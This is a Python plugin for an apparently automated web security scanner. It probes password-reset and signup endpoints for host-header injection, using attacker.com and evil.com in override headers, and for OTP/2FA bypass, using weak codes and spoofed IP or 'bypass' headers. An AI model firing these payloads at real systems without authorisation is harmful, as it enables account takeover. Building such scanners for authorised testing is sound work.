import json
import asyncio
from .base import BaseScanner
from .registry import register_scanner
from core.models import ScannerManifest, ScanTarget, FindingSeverity

ATO_ENDPOINTS = [
    "/reset", "/reset-password", "/forgot", "/forgot-password",
    "/api/reset", "/api/reset-password", "/api/forgot-password",
    "/api/v1/reset", "/api/auth/forgot", "/api/auth/reset",
    "/signup", "/register", "/api/signup", "/api/register",
]

HOST_OVERRIDE_HEADERS = [
    {"Host": "attacker.com"},
    {"X-Forwarded-Host": "attacker.com"},
    {"X-Original-Host": "attacker.com"},
    {"X-Forwarded-For": "evil.com"},
]

OTP_BYPASS_HEADERS = [
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Real-IP": "127.0.0.1"},
    {"X-Originating-IP": "127.0.0.1"},
    {"Client-IP": "127.0.0.1"},
    {"X-Proxy-User": "admin"},
    {"X-Auth-Type": "bypass"},
    {"X-Verified": "true"},
]

OTP_BYPASS_PAYLOADS = [
    {"otp": "000000"}, {"otp": "123456"}, {"otp": "111111"},
    {"code": "0000"}, {"code": "1234"}, {"code": "9999"},
    {"token": "000000"}, {"pin": "0000"},
]

TIMING_SLEEP = 2.0


@register_scanner(manifest=ScannerManifest(
    name="account_takeover_scanner",
    category="exploit",
    risk_level="aggressive",
    estimated_cost=80,
    produces_tag_patterns=["account-takeover", "ato", "password-reset", "2fa-bypass"],
    produces_endpoint_types=[],
))
class AccountTakeoverScanner(BaseScanner):
    name = "account_takeover_scanner"

    async def scan(self, target: ScanTarget) -> tuple[list, list]:
        findings = []
        endpoints = []
        client = await self.get_client()
        base = target.url.rstrip("/")

        for endpoint in ATO_ENDPOINTS:
            url = f"{base}{endpoint}"

            for hdrs in HOST_OVERRIDE_HEADERS:
                try:
                    resp = await client.post(url, headers=hdrs, json={"email": "test@test.com"}, follow_redirects=True)
                    self._stats["requests"] += 1
                    body = resp.text or ""

                    if "attacker.com" in body or "evil.com" in body:
                        ep = self.make_endpoint(url=url, status_code=resp.status_code, discovered_by=self.name)
                        endpoints.append(ep)
                        findings.append(self.make_finding(
                            title="Account Takeover — Host Header Injection in Password Reset",
                            description=f"Password reset at {url} reflected attacker-controlled host in response.",
                            severity=FindingSeverity.HIGH.value,
                            endpoint=ep,
                            evidence={"url": url, "headers": json.dumps(hdrs), "body_preview": body[:250]},
                            confidence=0.85,
                            tags=["account-takeover", "password-reset", "host-injection"],
                        ))
                except Exception:
                    self._stats["errors"] += 1

            for otp_payload in OTP_BYPASS_PAYLOADS:
                for bypass_headers in OTP_BYPASS_HEADERS:
                    try:
                        start = asyncio.get_event_loop().time()
                        resp = await client.post(url, headers=bypass_headers, json=otp_payload, follow_redirects=False)
                        elapsed = asyncio.get_event_loop().time() - start
                        self._stats["requests"] += 1

                        if resp.status_code in (200, 302) and elapsed < TIMING_SLEEP * 1.5:
                            ep = self.make_endpoint(url=url, status_code=resp.status_code, discovered_by=self.name)
                            endpoints.append(ep)
                            findings.append(self.make_finding(
                                title="Account Takeover — OTP/2FA Bypass Attempt",
                                description=f"OTP bypass at {url}: status {resp.status_code} with payload {otp_payload} and headers {bypass_headers}.",
                                severity=FindingSeverity.CRITICAL.value,
                                endpoint=ep,
                                evidence={
                                    "url": url,
                                    "otp_payload": json.dumps(otp_payload),
                                    "bypass_headers": json.dumps(bypass_headers),
                                    "status": resp.status_code,
                                    "elapsed": elapsed,
                                },
                                confidence=0.5,
                                tags=["account-takeover", "otp-bypass", "2fa-bypass"],
                            ))
                    except Exception:
                        self._stats["errors"] += 1

        return findings, endpoints
